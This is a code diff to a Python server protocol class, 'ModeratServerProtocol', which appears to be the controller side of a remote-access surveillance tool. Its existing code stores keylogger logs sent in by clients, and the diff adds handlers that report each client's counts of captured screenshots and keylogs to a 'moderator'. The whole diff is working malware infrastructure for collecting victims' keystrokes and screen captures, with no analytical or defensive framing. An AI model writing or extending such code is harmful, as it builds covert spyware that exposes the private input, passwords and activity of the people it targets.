@@ -162,8 +162,8 @@ class ModeratServerProtocol(Protocol):
 
         elif mode == 'keyloggerLogs':
             keylogger_info = ast.literal_eval(payload)
-            html_path = html_generator(key, keylogger_info, DATA_STORAGE)
-            manageKeylogs.save_keylog(key, keylogger_info['window_title'], keylogger_info['time'], html_path)
+            html_path, datetime_stamp = html_generator(key, keylogger_info, DATA_STORAGE)
+            manageKeylogs.save_keylog(key, datetime_stamp, html_path)
             log.info('Keylogs Saved (%s)' % key)
 
         elif moderators.has_key(session_id):
@@ -279,6 +279,20 @@ class ModeratServerProtocol(Protocol):
             client_id, moderator_id = data['payload'].split()
             manageClients.set_moderator(client_id, moderator_id)
             log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))
+
+        elif data['mode'] == 'countScreenshots':
+            client_id, date = data['payload'].split()
+            not_downloaded = manageScreenshots.get_screenshots_count_0(client_id, date)
+            downloaded = manageScreenshots.get_screenshots_count_1(client_id, date)
+            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countScreenshots')
+            log.info('Screenshots Count Sent to Moderator')
+
+        elif data['mode'] == 'countKeylogs':
+            client_id, date = data['payload'].split()
+            not_downloaded = manageKeylogs.get_keylogs_count_0(client_id, date)
+            downloaded = manageKeylogs.get_keylogs_count_1(client_id, date)
+            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countKeylogs')
+            log.info('Keylogs Count Sent to Moderator')
 
 
         # Send Commands To Clients
